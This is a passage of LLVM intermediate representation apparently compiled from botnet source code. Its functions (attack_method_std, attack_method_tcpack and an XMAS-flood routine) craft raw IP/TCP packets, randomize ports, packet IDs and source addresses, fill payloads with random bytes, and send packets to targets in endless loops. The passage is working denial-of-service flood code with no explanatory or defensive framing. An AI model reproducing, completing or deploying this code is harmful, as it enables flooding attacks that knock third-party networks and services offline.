  store %struct.iphdr* %508, %struct.iphdr** %40, align 8
  %509 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %510 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %509, i64 1
  %511 = bitcast %struct.iphdr* %510 to %struct.tcphdr*
  store %struct.tcphdr* %511, %struct.tcphdr** %41, align 8
  %512 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i64 1
  %514 = bitcast %struct.tcphdr* %513 to i8*
  store i8* %514, i8** %42, align 8
  %515 = load i16, i16* %14, align 2
  %516 = zext i16 %515 to i32
  %517 = icmp eq i32 %516, 65535
  br i1 %517, label %518, label %524

518:                                              ; preds = %501
  %519 = call i32 @rand_next()
  %520 = and i32 %519, 65535
  %521 = trunc i32 %520 to i16
  %522 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %523 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %522, i32 0, i32 3
  store i16 %521, i16* %523, align 4
  br label %524

524:                                              ; preds = %518, %501
  %525 = load i8, i8* %25, align 1
  %526 = icmp ne i8 %525, 0
  br i1 %526, label %527, label %530

527:                                              ; preds = %524
  %528 = load i8*, i8** %42, align 8
  %529 = load i32, i32* %24, align 4
  call void @rand_str(i8* noundef %528, i32 noundef %529)
  br label %530

530:                                              ; preds = %527, %524
  %531 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %532 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %531, i32 0, i32 7
  store i16 0, i16* %532, align 2
  %533 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %534 = bitcast %struct.iphdr* %533 to i16*
  %535 = call zeroext i16 @checksum_generic(i16* noundef %534, i32 noundef 20)
  %536 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %537 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %536, i32 0, i32 7
  store i16 %535, i16* %537, align 2
  %538 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %539 = load i32, i32* %9, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %538, i64 %540
  %542 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %541, i32 0, i32 1
  %543 = load i32, i32* %542, align 4
  %544 = add i32 %543, 1
  store i32 %544, i32* %542, align 4
  %545 = trunc i32 %543 to i16
  %546 = call zeroext i16 @htons(i16 noundef zeroext %545) #9
  %547 = zext i16 %546 to i32
  %548 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %549 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %548, i32 0, i32 2
  store i32 %547, i32* %549, align 4
  %550 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %551 = load i32, i32* %9, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %550, i64 %552
  %554 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %553, i32 0, i32 2
  %555 = load i32, i32* %554, align 4
  %556 = trunc i32 %555 to i16
  %557 = call zeroext i16 @htons(i16 noundef zeroext %556) #9
  %558 = zext i16 %557 to i32
  %559 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %560 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %559, i32 0, i32 3
  store i32 %558, i32* %560, align 4
  %561 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %562 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %561, i32 0, i32 6
  store i16 0, i16* %562, align 4
  %563 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %564 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %565 = bitcast %struct.tcphdr* %564 to i8*
  %566 = load i32, i32* %24, align 4
  %567 = sext i32 %566 to i64
  %568 = add i64 20, %567
  %569 = trunc i64 %568 to i16
  %570 = call zeroext i16 @htons(i16 noundef zeroext %569) #9
  %571 = load i32, i32* %24, align 4
  %572 = sext i32 %571 to i64
  %573 = add i64 20, %572
  %574 = trunc i64 %573 to i32
  %575 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %563, i8* noundef %565, i16 noundef zeroext %570, i32 noundef %574)
  %576 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 6
  store i16 %575, i16* %577, align 4
  %578 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 1
  %580 = load i16, i16* %579, align 2
  %581 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %582 = load i32, i32* %9, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %581, i64 %583
  %585 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %584, i32 0, i32 0
  %586 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %585, i32 0, i32 1
  store i16 %580, i16* %586, align 2
  %587 = load i32, i32* %10, align 4
  %588 = load i8*, i8** %39, align 8
  %589 = load i32, i32* %24, align 4
  %590 = sext i32 %589 to i64
  %591 = add i64 40, %590
  %592 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %593 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %594 = load i32, i32* %9, align 4
  %595 = sext i32 %594 to i64
  %596 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %593, i64 %595
  %597 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %596, i32 0, i32 0
  %598 = bitcast %struct.sockaddr_in* %597 to %struct.sockaddr*
  store %struct.sockaddr* %598, %struct.sockaddr** %592, align 8
  %599 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %600 = load %struct.sockaddr*, %struct.sockaddr** %599, align 8
  %601 = call i64 @sendto(i32 noundef %587, i8* noundef %588, i64 noundef %591, i32 noundef 16384, %struct.sockaddr* %600, i32 noundef 16)
  br label %602

602:                                              ; preds = %530
  %603 = load i32, i32* %9, align 4
  %604 = add nsw i32 %603, 1
  store i32 %604, i32* %9, align 4
  br label %496, !llvm.loop !16

605:                                              ; preds = %496
  br label %495

606:                                              ; preds = %202, %111, %105
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #1

declare i32 @close(i32 noundef) #4

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #4

; Function Attrs: nounwind
declare i64 @time(i64* noundef) #1

declare i64 @recvfrom(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr*, i32* noundef) #4

; Function Attrs: nounwind
declare noalias i8* @malloc(i64 noundef) #1

declare i64 @sendto(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr*, i32 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_std(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 noundef %24, i64 noundef 8) #8
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 noundef %28, i64 noundef 4) #8
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 noundef zeroext %31, %struct.attack_option* noundef %32, i8 noundef zeroext 7, i32 noundef 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 noundef zeroext %35, %struct.attack_option* noundef %36, i8 noundef zeroext 6, i32 noundef 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 noundef zeroext %39, %struct.attack_option* noundef %40, i8 noundef zeroext 0, i32 noundef 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 noundef zeroext %43, %struct.attack_option* noundef %44, i8 noundef zeroext 1, i32 noundef 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %47, i8 0, i64 16, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

51:                                               ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

54:                                               ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 noundef zeroext %55) #9
  store i16 %56, i16* %13, align 2
  br label %57

57:                                               ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

58:                                               ; preds = %170, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %173

63:                                               ; preds = %58
  %64 = call noalias i8* @calloc(i64 noundef 65535, i64 noundef 1) #8
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

72:                                               ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

81:                                               ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 noundef zeroext %82) #9
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

90:                                               ; preds = %81, %72
  %91 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #8
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

97:                                               ; preds = %90
  ret void

98:                                               ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 noundef %108, %struct.sockaddr* %112, i32 noundef 16) #8
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

115:                                              ; preds = %98
  br label %116

116:                                              ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %151

125:                                              ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 noundef %131) #9
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = add i32 %132, %141
  %143 = call i32 @htonl(i32 noundef %142) #9
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 0
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %148, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  store i32 %143, i32* %150, align 4
  br label %151

151:                                              ; preds = %125, %116
  %152 = load i32*, i32** %11, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %158 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 0
  %163 = bitcast %struct.sockaddr_in* %162 to %struct.sockaddr*
  store %struct.sockaddr* %163, %struct.sockaddr** %157, align 8
  %164 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %165 = load %struct.sockaddr*, %struct.sockaddr** %164, align 8
  %166 = call i32 @connect(i32 noundef %156, %struct.sockaddr* %165, i32 noundef 16)
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %168, label %169

168:                                              ; preds = %151
  br label %169

169:                                              ; preds = %168, %151
  br label %170

170:                                              ; preds = %169
  %171 = load i32, i32* %9, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %9, align 4
  br label %58, !llvm.loop !17

173:                                              ; preds = %58
  br label %174

174:                                              ; preds = %205, %173
  store i32 0, i32* %9, align 4
  br label %175

175:                                              ; preds = %202, %174
  %176 = load i32, i32* %9, align 4
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp slt i32 %176, %178
  br i1 %179, label %180, label %205

180:                                              ; preds = %175
  %181 = load i8**, i8*** %10, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds i8*, i8** %181, i64 %183
  %185 = load i8*, i8** %184, align 8
  store i8* %185, i8** %22, align 8
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

188:                                              ; preds = %180
  %189 = load i8*, i8** %22, align 8
  %190 = load i16, i16* %14, align 2
  %191 = zext i16 %190 to i32
  call void @rand_str(i8* noundef %189, i32 noundef %191)
  br label %192

192:                                              ; preds = %188, %180
  %193 = load i32*, i32** %11, align 8
  %194 = load i32, i32* %9, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %193, i64 %195
  %197 = load i32, i32* %196, align 4
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i64
  %201 = call i64 @send(i32 noundef %197, i8* noundef %198, i64 noundef %200, i32 noundef 16384)
  br label %202

202:                                              ; preds = %192
  %203 = load i32, i32* %9, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %9, align 4
  br label %175, !llvm.loop !18

205:                                              ; preds = %175
  br label %174
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_tcpack(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 noundef %38, i64 noundef 8) #8
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 noundef zeroext %41, %struct.attack_option* noundef %42, i8 noundef zeroext 2, i32 noundef 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 noundef zeroext %45, %struct.attack_option* noundef %46, i8 noundef zeroext 3, i32 noundef 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 noundef zeroext %49, %struct.attack_option* noundef %50, i8 noundef zeroext 4, i32 noundef 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 noundef zeroext %53, %struct.attack_option* noundef %54, i8 noundef zeroext 5, i32 noundef 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 noundef zeroext %57, %struct.attack_option* noundef %58, i8 noundef zeroext 6, i32 noundef 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 noundef zeroext %61, %struct.attack_option* noundef %62, i8 noundef zeroext 7, i32 noundef 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 noundef zeroext %65, %struct.attack_option* noundef %66, i8 noundef zeroext 17, i32 noundef 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 18, i32 noundef 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 noundef zeroext %71, %struct.attack_option* noundef %72, i8 noundef zeroext 11, i32 noundef 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 noundef zeroext %75, %struct.attack_option* noundef %76, i8 noundef zeroext 12, i32 noundef 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 noundef zeroext %79, %struct.attack_option* noundef %80, i8 noundef zeroext 13, i32 noundef 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 noundef zeroext %83, %struct.attack_option* noundef %84, i8 noundef zeroext 14, i32 noundef 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 noundef zeroext %87, %struct.attack_option* noundef %88, i8 noundef zeroext 15, i32 noundef 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 noundef zeroext %91, %struct.attack_option* noundef %92, i8 noundef zeroext 16, i32 noundef 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 noundef zeroext %95, %struct.attack_option* noundef %96, i8 noundef zeroext 0, i32 noundef 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 noundef zeroext %98, %struct.attack_option* noundef %99, i8 noundef zeroext 1, i32 noundef 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = call i32 @attack_get_opt_ip(i8 noundef zeroext %102, %struct.attack_option* noundef %103, i8 noundef zeroext 25, i32 noundef 100)
  store i32 %104, i32* %28, align 4
  %105 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #8
  store i32 %105, i32* %10, align 4
  %106 = icmp eq i32 %105, -1
  br i1 %106, label %107, label %108

107:                                              ; preds = %4
  br label %439

108:                                              ; preds = %4
  store i32 1, i32* %9, align 4
  %109 = load i32, i32* %10, align 4
  %110 = bitcast i32* %9 to i8*
  %111 = call i32 @setsockopt(i32 noundef %109, i32 noundef 0, i32 noundef 3, i8* noundef %110, i32 noundef 4) #8
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %116

113:                                              ; preds = %108
  %114 = load i32, i32* %10, align 4
  %115 = call i32 @close(i32 noundef %114)
  br label %439

116:                                              ; preds = %108
  store i32 0, i32* %9, align 4
  br label %117

117:                                              ; preds = %276, %116
  %118 = load i32, i32* %9, align 4
  %119 = load i8, i8* %5, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp slt i32 %118, %120
  br i1 %121, label %122, label %279

122:                                              ; preds = %117
  %123 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 1) #8
  %124 = load i8**, i8*** %11, align 8
  %125 = load i32, i32* %9, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i8*, i8** %124, i64 %126
  store i8* %123, i8** %127, align 8
  %128 = load i8**, i8*** %11, align 8
  %129 = load i32, i32* %9, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8*, i8** %128, i64 %130
  %132 = load i8*, i8** %131, align 8
  %133 = bitcast i8* %132 to %struct.iphdr*
  store %struct.iphdr* %133, %struct.iphdr** %29, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i64 1
  %136 = bitcast %struct.iphdr* %135 to %struct.tcphdr*
  store %struct.tcphdr* %136, %struct.tcphdr** %30, align 8
  %137 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %138 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %137, i64 1
  %139 = bitcast %struct.tcphdr* %138 to i8*
  store i8* %139, i8** %31, align 8
  %140 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %141 = bitcast %struct.iphdr* %140 to i8*
  %142 = load i8, i8* %141, align 4
  %143 = and i8 %142, 15
  %144 = or i8 %143, 64
  store i8 %144, i8* %141, align 4
  %145 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %146 = bitcast %struct.iphdr* %145 to i8*
  %147 = load i8, i8* %146, align 4
  %148 = and i8 %147, -16
  %149 = or i8 %148, 5
  store i8 %149, i8* %146, align 4
  %150 = load i8, i8* %12, align 1
  %151 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 1
  store i8 %150, i8* %152, align 1
  %153 = load i32, i32* %26, align 4
  %154 = sext i32 %153 to i64
  %155 = add i64 40, %154
  %156 = trunc i64 %155 to i16
  %157 = call zeroext i16 @htons(i16 noundef zeroext %156) #9
  %158 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 2
  store i16 %157, i16* %159, align 2
  %160 = load i16, i16* %13, align 2
  %161 = call zeroext i16 @htons(i16 noundef zeroext %160) #9
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 3
  store i16 %161, i16* %163, align 4
  %164 = load i8, i8* %14, align 1
  %165 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 5
  store i8 %164, i8* %166, align 4
  %167 = load i8, i8* %15, align 1
